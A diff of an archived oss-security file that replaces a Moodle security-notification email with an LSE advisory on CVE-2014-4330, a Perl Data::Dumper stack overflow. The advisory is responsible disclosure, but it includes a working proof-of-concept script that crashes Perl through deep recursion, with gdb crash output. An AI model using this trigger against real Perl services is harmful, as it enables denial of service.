@@ -1,84 +1,123 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/20/1
-Message-ID: <52DC750B.5010301@moodle.com>
-Date: Mon, 20 Jan 2014 08:59:55 +0800
-From: Michael de Raadt <michaeld@...dle.com>
-To: oss-security@...ts.openwall.com
-Subject: Moodle security notifications public
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/25/12
+Message-ID: <5423D985.6060007@lsexperts.de>
+Date: Thu, 25 Sep 2014 10:59:49 +0200
+From: advisories <advisories@...xperts.de>
+To: bugtraq@...urityfocus.com
+CC: oss-security@...ts.openwall.com, submissions@...ketstormsecurity.org,  fulldisclosure@...lists.org, bugs@...uritytracker.com
+Subject: LSE Leading Security Experts GmbH - LSE-2014-06-10 - Perl CORE - Deep Recursion Stack Overflow
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+=== LSE Leading Security Experts GmbH - Security Advisory LSE-2014-06-10 ===
 
-The following security notifications are now public after release.
+Perl CORE - Deep Recursion Stack Overflow
+-----------------------------------------
 
-Thanks to OSS members for their continued cooperation.
-
-=======================================================================
-MSA-14-0001: Config passwords visibility issue
-
-Description:       Some password changes on admin pages were being
-                   recorded and shown to administrators in the config
-                   log report.
-Issue summary:     Config Changes Report reveals passwords as plain
-                   text
-Severity/Risk:     Minor
-Versions affected: 2.6, 2.5 to 2.5.4, 2.4 to 2.4.7 and earlier
-                   unsupported versions
-Versions fixed:    2.6.1, 2.5.4 and 2.4.8
-Reported by:       Andrew Steele
-Issue no.:         MDL-36721
-CVE identifier:    CVE-2014-0008
-Changes (master):
-http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-36721
-
-=======================================================================
-MSA-14-0002: Group constraints lacking in "login as"
-
-Description:       Users were able to log in as a user who in a is not
-                   in the same group without the permission to see all
-                   groups.
-Issue summary:     Users with loginas permission and access all groups
-                   prohibited can login as user not in their group by
-                   direct url
-Severity/Risk:     Minor
-Versions affected: 2.6, 2.5 to 2.5.4, 2.4 to 2.4.7, 2.3 to 2.3.10 and
-                   earlier unsupported versions
-Versions fixed:    2.6.1, 2.5.4, 2.4.8 and 2.3.11
-Reported by:       Itamar Tzadok
-Issue no.:         MDL-42643
-CVE identifier:    CVE-2014-0009
-Changes (master):
-http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-42643
-
-=======================================================================
-MSA-14-0003: Cross-site request forgery vulnerability in profile fields
-
-Description:       Custom profile fields and categories were open to
-                   deletion without proper session checking.
-Issue summary:     Two Cross-site Request Forgery(CSRF) vulnerabilities
-                   found in /user/profile/index.php
-Severity/Risk:     Serious
-Versions affected: 2.6, 2.5 to 2.5.4, 2.4 to 2.4.7, 2.3 to 2.3.10 and
-                   earlier unsupported versions
-Versions fixed:    2.6.1, 2.5.4, 2.4.8 and 2.3.11
-Reported by:       Jun Zhu
-Issue no.:         MDL-42883
-CVE identifier:    CVE-2014-0010
-Changes (master):
-http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-42883
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2.0.22 (MingW32)
-Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
-
-iQEcBAEBAgAGBQJS3HS7AAoJECGmGwK/mszPKxMIAIkiFaKtzEKI/3n4TOqU5AcF
-Mkm4k60lQgXxRYVptpReDqCUEX08oI86rCtz8vqNx0p04nerhd54An6l9E6uRQrg
-40uHGR++LkD2ULflZyFPyQl+GgzGiuAtkvlIq84k5t5WtpkfqQi9DA5GMEpRzu4G
-26yCd1oaVKPr22vLfGGbjtYdDHaSGTEdFuB6hvDM5pl7WsTzNg35n9Bwb7QnmbqL
-saMiPrRJ8uVgDqP6roZDuidMTdOcxHPfAxuv4pNhkTbjmB4jtYs7Wz91sbqX90cb
-u8LbFygvgZ5UnjuCxVlycL/MLaMDr8ucfl1tVBWp/iBzipd0AOh6zurI1tijORs=
-=xb4F
------END PGP SIGNATURE-----
+Affected Versions
+=================
+Perl v5.20.1 and below
 
 
-Download attachment "smime.p7s" of type "application/pkcs7-signature" (3748 bytes)
+Issue Overview
+==============
+Vulnerability Type: Stack Overflow
+Technical Risk: high
+Likelihood of Exploitation: low
+Vendor: Perl
+Vendor URL: http://www.perl.org
+Credits: LSE Leading Security Experts GmbH employee Markus Vervier
+Advisory URL: https://www.lsexperts.de/advisories/lse-2014-06-10.txt
+Advisory Status: Public
+CVE-Number: CVE-2014-4330
+CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4330
+
+
+Impact
+======
+When the runtime stack grows over its maximal size, a guard page on most modern
+operating systems is hit causing the Perl interpreter to crash.
+Depending on context code execution on some architectures might be possible
+if certain conditions are met.
+
+
+Issue Description
+=================
+During internal development a stack overflow was discovered when serializing
+data via the Data::Dumper extension which is part of Perl-Core.
+By using the "Dumper" method on a large Array-Reference which recursively
+contains other Array-References, it is possible to cause many recursive
+calls to the DD_dump native function and ultimately exhaust all available stack
+memory.
+
+
+Temporary Workaround and Fix
+============================
+Applications written in Perl should ensure that a sanity check on data
+serialized by Data::Dumper is performed.
+
+According to the vendor a patch is available and coordinated with downstream
+vendors.
+
+
+Proof of Concept
+================
+$ cat min.pl
+use strict;
+use Data::Dumper;
+
+my $dumpme = [];
+for (my $i = 0; $i < $ARGV[0]; $i++) {
+	$dumpme = [$dumpme, "AAAAAAAA"];
+}
+print Dumper($dumpme);
+
+$ gdb --args perl min.pl 20000
+GNU gdb (GDB) 7.4.1-debian
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later
+<http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /usr/bin/perl...Reading symbols from
+/usr/lib/debug/usr/bin/perl...done.
+done.
+(gdb) run
+Starting program: /usr/bin/perl min.pl 20000
+warning: no loadable sections found in added symbol-file system-supplied
+DSO at
+0x7ffff7ffa000
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+_IO_vfprintf_internal (s=0x7fffff7ff5c0, format=0x7ffff6bf5f89 "%ld",
+    ap=0x7fffff7ff6f0) at vfprintf.c:1328
+1328	vfprintf.c: No such file or directory.
+
+It was confirmed that the overflow can be triggered via the XML::Parser
+extension when parsing and dumping specially crafted XML-Documents.
+
+
+History
+=======
+2014-06-10 Issue discovery during internal development
+2014-06-11 Vendor contacted
+2014-06-11 Vendor reply
+2014-06-13 CVE requested
+2014-07-01 Vulnerability confirmed by vendor
+2014-07-02 CVE-2014-4330 assigned
+2014-09-25 Advisory released
+
+GPG Signature
+=============
+This advisory is signed with the GPG key of the
+LSE Leading Security Experts GmbH advisories team.
+The key can be downloaded here: https://www.lsexperts.de/advisories-key-99E3277C.asc
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
